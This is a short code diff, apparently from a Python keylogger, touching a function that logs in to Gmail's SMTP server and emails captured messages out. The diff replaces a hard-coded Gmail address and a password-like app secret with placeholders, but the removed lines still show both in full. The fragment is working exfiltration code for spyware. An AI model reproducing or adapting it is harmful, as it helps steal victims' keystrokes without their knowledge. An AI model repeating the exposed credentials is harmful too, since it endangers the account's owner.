@@ -21,8 +21,8 @@ def callback_function(key):
 def send_email(message):
     server = smtplib.SMTP('smtp.gmail.com', 587)
     server.starttls()
-    server.login("sanalmakina50@gmail.com", "owsplmhecsadloew")
-    server.sendmail("sanalmakina50@gmail.com", "sanalmakina50@gmail.com",message)
+    server.login("<email>", "<password>")
+    server.sendmail("<Sender Email>", "<recipient email>",message)
     server.quit()
 
 
